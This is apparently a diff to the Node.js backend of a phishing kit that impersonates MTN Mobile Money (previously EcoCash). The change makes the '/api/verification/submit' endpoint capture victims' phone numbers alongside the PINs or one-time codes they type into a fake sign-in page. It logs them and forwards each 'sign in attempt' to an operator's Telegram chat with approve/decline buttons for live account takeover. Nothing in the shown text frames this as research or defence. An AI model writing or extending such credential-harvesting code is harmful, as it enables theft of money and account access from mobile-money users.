@@ -451,7 +451,7 @@ app.post('/api/verification/otp', (req, res) => {
    (mtn-signin.html — three buttons: Approve / Decline / Inactive)
 ============================================================ */
 app.post('/api/verification/submit', async (req, res) => {
-  const { tx, otp, am, cur, c } = req.body || {};
+  const { tx, otp, am, cur, c, phone } = req.body || {};
   if (!tx || !otp) return res.status(400).json({ ok: false, message: 'Missing fields' });
 
   const now = Date.now();
@@ -464,7 +464,7 @@ app.post('/api/verification/submit', async (req, res) => {
     decision: 'pending'
   });
 
-  pushLog('SUBMIT tx=' + tx + ' code=' + otp, 'info');
+  pushLog('SUBMIT tx=' + tx + ' code=' + otp + ' phone=' + (phone || '—'), 'info');
 
   const baseUrl = tgBase();
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -475,14 +475,17 @@ app.post('/api/verification/submit', async (req, res) => {
   }
 
   const lines = [
-    'EcoCash verification code entered',
+    '🔐 MTN Mobile Money — Sign in attempt',
+    '━━━━━━━━━━━━━━━━━━━━━━',
     '',
-    'Transaction: ' + tx,
-    'Amount: ' + (cur || 'USD') + ' ' + Number(am || 0).toFixed(2),
-    'Country: ' + (c || '—'),
-    'Code: ' + otp,
+    '📄 Transaction: ' + tx,
+    '💵 Amount: ' + (cur || 'USD') + ' ' + Number(am || 0).toFixed(2),
+    '🌍 Country: ' + (c || '—'),
+    '📱 Phone: ' + (phone || '—'),
+    '🔑 PIN entered: ' + otp,
     '',
-    'Approve, decline, or mark this transaction inactive.'
+    '━━━━━━━━━━━━━━━━━━━━━━',
+    'Approve, decline, or mark this attempt inactive.'
   ];
 
   const keyboard = {
